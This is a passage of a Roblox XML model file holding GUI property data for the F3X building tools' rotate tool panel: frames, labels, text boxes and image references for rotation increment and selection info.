										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>5</XO>
											<YS>0</YS>
											<YO>-3</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-5</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBX8937D0FD5BEB470FA2579B6AF3B234B6">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">ROTATE TOOL</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBX97B2108D35FA404190E13FEF733FE746">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">5</token>
										<string name="Name">F3XSignature</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">F3X</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">14</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.899999976</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">1</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX3477FBF0CDE6480CADF226A2F53B253C">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">IncrementOption</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>65</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBX8FB225545F5547FF850885343D1F406D">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Increment</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>70</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>50</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX11301FDBCB3D42288237B207B47F39B1">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">SelectedIndicator</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>-2</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-4</XO>
												<YS>0</YS>
												<YO>2</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextBox" referent="RBX24D998320DB242BFBCE35C2E33CC5F92">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClearTextOnFocus">true</bool>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<bool name="MultiLine">false</bool>
											<string name="Name">TextBox</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<bool name="ShowNativeInput">true</bool>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-10</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">15</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">2</int>
										</Properties>
									</Item>
									<Item class="ImageLabel" referent="RBX176D85D31DCE42B6BDC6FD94F2429112">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
											<Color3 name="ImageColor3">4294967295</Color3>
											<Vector2 name="ImageRectOffset">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Vector2 name="ImageRectSize">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<float name="ImageTransparency">0</float>
											<string name="Name">Background</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<token name="ScaleType">0</token>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<Rect2D name="SliceCenter">
												<min>
													<X>0</X>
													<Y>0</Y>
												</min>
												<max>
													<X>0</X>
													<Y>0</Y>
												</max>
											</Rect2D>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="Frame" referent="RBX623289E4F2C74F3BBA3E4E838673827C">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>75</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextLabel" referent="RBXCF4299DF5D494E91AFDC16CC563DA144">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<string name="Name">TextLabel</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">Increment</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">0</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">true</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX6E17C632CDDD471C90832B151E0CB304">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Info</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>5</XO>
										<YS>0</YS>
										<YO>100</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-5</XO>
										<YS>0</YS>
										<YO>60</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">false</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBX40EB2E1B4BE34833B2C9634F292D422B">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4283144011</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBXEC4992E3B193447F97415BE94020A3B7">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">SELECTION INFO</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBXC97ACE05FF934074A36BD9F1CEFBDA8F">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">RotationInfo</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>30</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextLabel" referent="RBX41AEA00D830A4068A6D1138071C5E71B">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<string name="Name">TextLabel</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>75</XO>
												<YS>0</YS>
												<YO>25</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">Rotation</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">0</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">true</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBX1C86E554669A46FFBDE8768231A311EF">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">X</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>70</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>50</XO>
												<YS>0</YS>
												<YO>25</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextBox" referent="RBXCB10C77D21B54E39BCF8AD2697D58AD8">
											<Properties>
												<bool name="Active">true</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClearTextOnFocus">true</bool>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<bool name="MultiLine">false</bool>
												<string name="Name">TextBox</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>5</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">true</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<bool name="ShowNativeInput">true</bool>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>-10</XO>
													<YS>1</YS>
													<YO>0</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text"></string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">2</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextButton" referent="RBXAA6CE20C26DF4C20B30ABBB8B82E4051">
											<Properties>
												<bool name="Active">true</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<bool name="AutoButtonColor">false</bool>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">0</token>
												<token name="FontSize">0</token>
												<bool name="Modal">false</bool>
												<string name="Name">TextButton</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">true</bool>
												<bool name="Selected">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>1</YS>
													<YO>0</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<string name="Text"></string>
												<Color3 name="TextColor3">4279970357</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">8</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">2</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">2</int>
											</Properties>
										</Item>
										<Item class="ImageLabel" referent="RBX38B495A2DC1F4A5A851755E5D66E33A2">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
												<Color3 name="ImageColor3">4294967295</Color3>
												<Vector2 name="ImageRectOffset">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Vector2 name="ImageRectSize">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<float name="ImageTransparency">0</float>
												<string name="Name">Background</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<token name="ScaleType">0</token>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>1</YS>
													<YO>0</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<Rect2D name="SliceCenter">
													<min>
														<X>0</X>
														<Y>0</Y>
													</min>
													<max>
														<X>0</X>
														<Y>0</Y>
													</max>
												</Rect2D>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
									<Item class="Frame" referent="RBX3D6644A99A0D481CAD274FBF0FB7FD88">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Y</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>117</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>50</XO>
												<YS>0</YS>
												<YO>25</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextBox" referent="RBX31BD01A8B2AA40308AA37917DDB804F1">
											<Properties>
												<bool name="Active">true</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClearTextOnFocus">true</bool>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<bool name="MultiLine">false</bool>
												<string name="Name">TextBox</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>5</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">true</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<bool name="ShowNativeInput">true</bool>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>-10</XO>
													<YS>1</YS>
													<YO>0</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text"></string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
